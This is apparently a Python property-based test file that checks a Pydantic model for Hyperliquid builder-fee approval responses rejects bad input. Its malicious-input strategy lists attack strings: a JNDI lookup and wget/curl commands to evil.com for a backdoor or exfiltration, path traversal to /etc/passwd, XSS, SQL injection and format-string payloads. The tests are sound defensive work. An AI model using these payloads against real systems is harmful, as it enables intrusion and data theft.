"""Property-based tests for Hyperliquid raw builder fee approval models.

These tests validate critical security boundary models that process external builder fee approval data.
The models tested here are essential for fee approval tracking and validation.

SECURITY CRITICAL: These raw models protect against:
- Malicious builder fee data that could manipulate approval status
- Buffer overflow attacks through oversized approval structures
- Injection attacks through malformed approval data
- Type confusion that could bypass approval validation
- Boolean manipulation that could change approval status

Property testing ensures comprehensive coverage of builder fee edge cases and adversarial inputs.
"""

from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_builder_fee import (
    HyperliquidRawBuilderFeeApprovalResponse,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR BUILDER FEE MODEL TESTING
# =============================================================================


def valid_boolean_strategy() -> SearchStrategy[bool]:
    """Generate valid boolean values."""
    return st.booleans()


def valid_string_boolean_strategy() -> SearchStrategy[str]:
    """Generate valid string representations of boolean values."""
    return st.sampled_from([
        "true",
        "false",
        "True",
        "False",
        "TRUE",
        "FALSE",
    ])


@st.composite
def valid_builder_fee_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid builder fee approval data."""
    return {
        "approved": draw(
            st.one_of([
                valid_boolean_strategy(),
                valid_string_boolean_strategy(),
            ])
        )
    }


def malicious_builder_fee_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for builder fee security testing."""
    return st.one_of([
        # Builder fee manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-fees}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('fee-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE fees;--"),
        st.just("1' UNION SELECT * FROM approvals--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("F" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.fees.find(); //"),
        # JSON injection
        st.just('{"$where": "this.approved == true"}'),
        # Boolean manipulation
        st.just("true'; UPDATE fees SET approved=false;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
        # Invalid boolean strings
        st.just("maybe"),
        st.just("yes"),
        st.just("no"),
        st.just("1"),
        st.just("0"),
        st.just(""),
        st.just("   "),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW BUILDER FEE APPROVAL RESPONSE MODEL
# =============================================================================


class TestHyperliquidRawBuilderFeeApprovalResponseProperties:
    """Property-based tests for HyperliquidRawBuilderFeeApprovalResponse validation and security."""

    @given(fee_data=valid_builder_fee_data())
    def test_builder_fee_validation_success_properties(self, fee_data: dict[str, Any]) -> None:
        """Property: Valid builder fee data should always create valid response objects."""
        # Skip invalid data
        try:
            approved_value = fee_data["approved"]

            # Check if it's a valid boolean or string boolean
            if isinstance(approved_value, bool):
                assume(True)  # Always valid
            elif isinstance(approved_value, str):
                assume(approved_value.lower() in ["true", "false"])
            else:
                assume(False)

        except (TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawBuilderFeeApprovalResponse)

        # Property: Approved field should be boolean
        assert isinstance(obj.approved, bool)

        # Property: String booleans should be converted correctly
        if isinstance(fee_data["approved"], str):
            expected_bool = fee_data["approved"].lower() == "true"
            assert obj.approved == expected_bool
        else:
            assert obj.approved == fee_data["approved"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(malicious_value=malicious_builder_fee_strategy())
    def test_builder_fee_security_boundary_properties(self, malicious_value: Any) -> None:
        """Property: Builder fee response should reject malicious inputs safely."""
        fee_data = {"approved": malicious_value}

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)

    @given(
        invalid_boolean=st.one_of([
            # Non-boolean values that should be rejected
            st.integers().filter(lambda x: x not in [0, 1]),
            st.floats(),
            st.text().filter(lambda x: x.lower() not in ["true", "false"]),
            st.lists(st.booleans()),
            st.dictionaries(st.text(), st.booleans()),
            st.none(),
        ])
    )
    def test_builder_fee_invalid_approved_properties(self, invalid_boolean: Any) -> None:
        """Property: Builder fee should reject invalid boolean values."""
        fee_data = {"approved": invalid_boolean}

        # Property: Invalid boolean values should be rejected
        with pytest.raises((ValidationError, TypeError, TypeFieldError)):
            HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)

    def test_builder_fee_missing_field_properties(self) -> None:
        """Property: Builder fee should require approved field."""
        # Property: Missing required field should be rejected
        with pytest.raises(ValidationError) as exc_info:
            HyperliquidRawBuilderFeeApprovalResponse.model_validate({})

        # Property: Error should mention field requirement
        assert "required" in str(exc_info.value).lower()

    @given(
        valid_approved=st.booleans(),
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20).filter(lambda x: x != "approved"),
            st.one_of([st.text(), st.integers(), st.booleans()]),
            min_size=1,
            max_size=5,
        ),
    )
    def test_builder_fee_extra_fields_properties(
        self, valid_approved: bool, extra_fields: dict[str, Any]
    ) -> None:
        """Property: Builder fee response should forbid extra fields."""
        fee_data = {"approved": valid_approved}
        fee_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError) as exc_info:
            HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)

        # Property: Error should mention extra fields
        assert "extra" in str(exc_info.value).lower()

    @given(
        string_boolean=st.one_of([
            # Valid string booleans
            st.just("true"),
            st.just("false"),
            st.just("True"),
            st.just("False"),
            st.just("TRUE"),
            st.just("FALSE"),
            # Invalid string booleans
            st.just("yes"),
            st.just("no"),
            st.just("1"),
            st.just("0"),
            st.just("maybe"),
            st.just(""),
            st.just("   "),
            st.just("truE"),  # Mixed case
            st.just("falsE"),  # Mixed case
        ])
    )
    def test_builder_fee_string_boolean_conversion_properties(self, string_boolean: str) -> None:
        """Property: Builder fee should handle string boolean conversion correctly."""
        fee_data = {"approved": string_boolean}

        if string_boolean.lower() in ["true", "false"]:
            # Property: Valid string booleans should be accepted and converted
            obj = HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)
            expected_bool = string_boolean.lower() == "true"
            assert obj.approved == expected_bool
            assert isinstance(obj.approved, bool)
        else:
            # Property: Invalid string booleans should be rejected
            with pytest.raises((ValidationError, EmptyStringError)):
                HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)

    @given(fee_data=valid_builder_fee_data())
    def test_builder_fee_immutability_properties(self, fee_data: dict[str, Any]) -> None:
        """Property: Builder fee response should be immutable after creation."""
        # Skip invalid data
        try:
            approved_value = fee_data["approved"]
            if isinstance(approved_value, str):
                assume(approved_value.lower() in ["true", "false"])
        except (TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)

        # Property: Attempting to modify fields should fail (frozen=True)
        with pytest.raises((AttributeError, ValidationError)):
            obj.approved = not obj.approved

    @given(
        boolean_value=st.booleans(),
        operation=st.sampled_from(["negation", "and_operation", "or_operation"]),
    )
    def test_builder_fee_boolean_operations_properties(
        self, boolean_value: bool, operation: str
    ) -> None:
        """Property: Builder fee boolean values should support logical operations."""
        fee_data = {"approved": boolean_value}
        obj = HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)

        # Property: Boolean operations should work correctly
        if operation == "negation":
            result = not obj.approved
            assert result != obj.approved
            assert isinstance(result, bool)
        elif operation == "and_operation":
            result = obj.approved and True
            assert result == obj.approved
            assert isinstance(result, bool)
        elif operation == "or_operation":
            result = obj.approved or False
            assert result == obj.approved
            assert isinstance(result, bool)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawBuilderFeeIntegrationProperties:
    """Integration property tests for builder fee models working together."""

    @given(
        approved_values=st.lists(
            st.one_of([st.booleans(), valid_string_boolean_strategy()]),
            min_size=2,
            max_size=10,
        ),
        malicious_value=malicious_builder_fee_strategy(),
    )
    def test_builder_fee_batch_processing_properties(
        self, approved_values: list[bool | str], malicious_value: Any
    ) -> None:
        """Property: Multiple builder fee responses should be processed independently."""
        valid_responses = []

        for approved in approved_values:
            # Skip invalid string booleans
            if isinstance(approved, str) and approved.lower() not in ["true", "false"]:
                continue

            fee_data = {"approved": approved}
            response = HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)
            valid_responses.append(response)

        # Property: Each response should maintain its individual value
        for i, response in enumerate(valid_responses):
            assert isinstance(response.approved, bool)

            # Property: Responses should not affect each other
            for j, other_response in enumerate(valid_responses):
                if i != j:
                    # Each response is independent
                    assert isinstance(other_response.approved, bool)

        # Property: Malicious value should be rejected when injected
        if valid_responses:
            corrupted_data = {"approved": malicious_value}
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                HyperliquidRawBuilderFeeApprovalResponse.model_validate(corrupted_data)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from(["approved"]),
            malicious_builder_fee_strategy(),
            min_size=1,
            max_size=1,
        )
    )
    def test_builder_fee_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: Builder fee model should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawBuilderFeeApprovalResponse.model_validate(complete_malicious_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawBuilderFeeApprovalResponse_valid() -> None:
    """Test builder fee valid."""
    valid_builder_fee_data = {"approved": True}
    response = HyperliquidRawBuilderFeeApprovalResponse.model_validate(valid_builder_fee_data)
    assert response.approved == valid_builder_fee_data["approved"]


def test_HyperliquidRawBuilderFeeApprovalResponse_false() -> None:
    """Test builder fee with false approval."""
    fee_data = {"approved": False}
    response = HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)
    assert response.approved is False


def test_HyperliquidRawBuilderFeeApprovalResponse_string_true() -> None:
    """Test builder fee with string 'true'."""
    fee_data = {"approved": "true"}
    response = HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)
    assert response.approved is True


def test_HyperliquidRawBuilderFeeApprovalResponse_string_false() -> None:
    """Test builder fee with string 'false'."""
    fee_data = {"approved": "false"}
    response = HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)
    assert response.approved is False


def test_HyperliquidRawBuilderFeeApprovalResponse_string_True() -> None:
    """Test builder fee with string 'True'."""
    fee_data = {"approved": "True"}
    response = HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)
    assert response.approved is True


def test_HyperliquidRawBuilderFeeApprovalResponse_string_False() -> None:
    """Test builder fee with string 'False'."""
    fee_data = {"approved": "False"}
    response = HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)
    assert response.approved is False


def test_HyperliquidRawBuilderFeeApprovalResponse_invalid_string() -> None:
    """Test builder fee with invalid string."""
    fee_data = {"approved": "not-a-bool"}
    with pytest.raises(ValidationError):
        HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)


def test_HyperliquidRawBuilderFeeApprovalResponse_invalid_number() -> None:
    """Test builder fee with invalid number."""
    fee_data = {"approved": 123}
    with pytest.raises(ValidationError):
        HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)


def test_HyperliquidRawBuilderFeeApprovalResponse_missing_field() -> None:
    """Test builder fee missing approved field."""
    with pytest.raises(ValidationError, match="Field required"):
        HyperliquidRawBuilderFeeApprovalResponse.model_validate({})


def test_HyperliquidRawBuilderFeeApprovalResponse_extra_field() -> None:
    """Test builder fee extra field."""
    fee_data = {"approved": True, "extra": "field"}
    with pytest.raises(ValidationError):
        HyperliquidRawBuilderFeeApprovalResponse.model_validate(fee_data)
